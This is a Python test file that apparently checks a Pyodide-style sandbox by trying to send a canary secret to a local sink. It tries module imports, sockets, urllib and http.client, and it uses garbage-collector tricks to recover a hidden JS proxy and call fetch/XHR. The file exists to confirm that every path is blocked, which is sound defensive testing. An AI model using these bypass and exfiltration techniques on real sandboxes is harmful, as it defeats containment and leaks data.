# Planted exfiltration test: every path must fail loudly and send nothing.
SINK = "http://127.0.0.1:8001/hit"
SECRET = "LYNCEUS_CANARY_PY"
results = {}


def attempt(name, fn):
    try:
        fn()
        results[name] = "NOT BLOCKED"
    except BaseException as e:  # noqa
        results[name] = f"blocked: {type(e).__name__}: {e}"


def test_every_path_blocked():
    def imp(mod):
        return lambda: __import__(mod)

    attempt("import js", imp("js"))
    attempt("import pyodide.http", imp("pyodide.http"))
    attempt("import pyodide.ffi", imp("pyodide.ffi"))
    attempt("import micropip", imp("micropip"))
    attempt("import _pyodide", imp("_pyodide"))
    attempt("import pyodide_js", imp("pyodide_js"))

    def sock():
        import socket
        s = socket.socket()
        s.connect(("127.0.0.1", 8001))
    attempt("socket.connect", sock)

    def sock2():
        import socket
        socket.create_connection(("127.0.0.1", 8001))
    attempt("socket.create_connection", sock2)

    def ul():
        import urllib.request
        urllib.request.urlopen(SINK + "?d=" + SECRET + "-urllib")
    attempt("urllib.request.urlopen", ul)

    def hc():
        import http.client
        c = http.client.HTTPConnection("127.0.0.1", 8001)
        c.request("GET", "/hit?d=" + SECRET + "-httpclient")
    attempt("http.client", hc)

    def gc_bypass():
        # Real bypass attempt: dig the hidden js module back out of the garbage collector.
        import gc
        mods = [m for m in gc.get_objects() if type(m).__name__ == "module" and getattr(m, "__name__", "") == "js"]
        if not mods:
            raise LookupError("js module not reachable via gc")
        js = mods[0]
        js.fetch(SINK + "?d=" + SECRET + "-gc-fetch")
        x = js.XMLHttpRequest.new()
        x.open("GET", SINK + "?d=" + SECRET + "-gc-xhr", False)
        x.send()
    attempt("gc bypass -> js.fetch/XHR", gc_bypass)

    def gc_deep():
        # Stronger bypass: find ANY live JsProxy for the JS global scope via function globals.
        import gc
        found = None
        for o in gc.get_objects():
            g = getattr(o, "__globals__", None)
            if isinstance(g, dict):
                for v in list(g.values()):
                    if "JsProxy" in type(v).__name__ or (type(v).__name__ == "module" and getattr(v, "__name__", "") == "js"):
                        try:
                            if hasattr(v, "fetch"):
                                found = v
                                break
                        except Exception:
                            pass
            if found is not None:
                break
        if found is None:
            raise LookupError("no JsProxy with fetch reachable via gc")
        found.fetch(SINK + "?d=" + SECRET + "-gcdeep-fetch")
        x = found.XMLHttpRequest.new()
        x.open("GET", SINK + "?d=" + SECRET + "-gcdeep-xhr", False)
        x.send()
    attempt("gc deep bypass -> JsProxy.fetch/XHR", gc_deep)

    print("EXFIL_RESULTS", results)
    leaked = {k: v for k, v in results.items() if v == "NOT BLOCKED"}
    assert not leaked, f"exfiltration paths not blocked: {leaked}"
